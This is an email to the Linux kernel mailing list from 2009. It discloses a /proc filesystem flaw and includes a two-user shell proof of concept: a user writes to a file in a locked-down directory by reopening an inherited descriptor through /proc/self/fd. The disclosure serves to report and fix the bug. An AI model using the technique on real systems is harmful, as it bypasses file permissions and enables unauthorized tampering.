Return-Path: <linux-kernel-owner+w=401wt.eu-S1752804AbZJWRKd@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1752804AbZJWRKd (ORCPT <rfc822;w@1wt.eu>);
	Fri, 23 Oct 2009 13:10:33 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1752525AbZJWRKc
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Fri, 23 Oct 2009 13:10:32 -0400
Received: from atrey.karlin.mff.cuni.cz ([195.113.26.193]:39863 "EHLO
	atrey.karlin.mff.cuni.cz" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1752484AbZJWRKb (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Fri, 23 Oct 2009 13:10:31 -0400
Date: Fri, 23 Oct 2009 19:10:25 +0200
From: Pavel Machek <pavel@ucw.cz>
To: Jamie Lokier <jamie@shareable.org>
Cc: Miklos Szeredi <miklos@szeredi.hu>, Andreas Dilger <adilger@sun.com>,
       Valdis.Kletnieks@vt.edu, linux@treblig.org, agruen@suse.de,
       linux-fsdevel@vger.kernel.org, linux-kernel@vger.kernel.org
Subject: /proc filesystem allows bypassing directory permissions on Linux
 (was Re: [PATCH] vfs: new O_NODE open flag)
Message-ID: <20091023171025.GB24738@elf.ucw.cz>
References: <E1Mr3jF-0005G4-Sf@pomaz-ex.szeredi.hu>
 <20090925123747.GA31228@gallifrey>
 <9988.1253899252@turing-police.cc.vt.edu>
 <20090925183523.GA6065@gallifrey>
 <19645.1253913514@turing-police.cc.vt.edu>
 <E1MsDQ6-0001cY-92@pomaz-ex.szeredi.hu>
 <20090928152128.GA3384@webber.adilger.int>
 <E1MsIhu-0002AY-F2@pomaz-ex.szeredi.hu>
 <20091004190304.GJ1378@ucw.cz>
 <20091004225849.GA27481@shareable.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20091004225849.GA27481@shareable.org>
X-Warning: Reading this can be dangerous to your mental health.
User-Agent: Mutt/1.5.20 (2009-06-14)
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

Hi!

> > >  a) the current permission model under /proc/PID/fd has a security
> > >     hole (which Jamie is worried about)
> > 
> > I believe its bugtraq time. Being able to reopen file with additional
> > permissions looks like  a security problem...
> > 
> > Jamie, do you have some test script? And do you want your 15 minutes
> >  of bugtraq fame? ;-).

> The reopen does check the inode permission, but it does not require
> you have any reachable path to the file.  Someone _might_ use that as
> a traditional unix security mechanism, but if so it's probably quite rare.

Ok, I got this, with two users. I guess it is real (but obscure)
security hole.

So, we have this scenario. pavel is not doing anything interesting in
the background.

pavel@toy:/tmp$ uname -a
Linux toy.ucw.cz 2.6.32-rc3 #21 Mon Oct 19 07:32:02 CEST 2009 armv5tel GNU/Linux
pavel@toy:/tmp mkdir my_priv; cd my_priv
pavel@toy:/tmp/my_priv$ echo this file should never be writable > unwritable_file
# lock down directory
pavel@toy:/tmp/my_priv$ chmod 700 .
# relax file permissions, directory is private, so this is safe
# check link count on unwritable_file. We would not want someone 
# to have a hard link to work around our permissions, would we?
pavel@toy:/tmp/my_priv$ chmod 666 unwritable_file 
pavel@toy:/tmp/my_priv$ cat unwritable_file 
this file should never be writable
pavel@toy:/tmp/my_priv$ cat unwritable_file 
got you
# Security problem here

[Please pause here for a while before reading how guest did it.]

Unexpected? Well, yes, to me anyway. Linux specific? Yes, I think so.

So what did happen? User guest was able to work around directory
permissions in the background, using /proc filesystem.

guest@toy:~$ bash 3< /tmp/my_priv/unwritable_file 
# Running inside nested shell
guest@toy:~$ read A <&3
guest@toy:~$ echo $A
this file should never be writable

guest@toy:~$ cd /tmp/my_priv
guest@toy:/tmp/my_priv$ ls
unwritable_file

# pavel did chmod 000, chmod 666 here
guest@toy:/tmp/my_priv$ ls
ls: cannot open directory .: Permission denied

# Linux correctly prevents guest from writing to that file
guest@toy:/tmp/my_priv$ cat unwritable_file
cat: unwritable_file: Permission denied
guest@toy:/tmp/my_priv$ echo got you >&3
bash: echo: write error: Bad file descriptor

# ...until we take a way around it with /proc filesystem. Oops.
guest@toy:/tmp/my_priv$ echo got you > /proc/self/fd/3 

								Pavel
-- 
(english) http://www.livejournal.com/~pavelmachek
(cesky, pictures) http://atrey.karlin.mff.cuni.cz/~pavel/picture/horses/blog.html
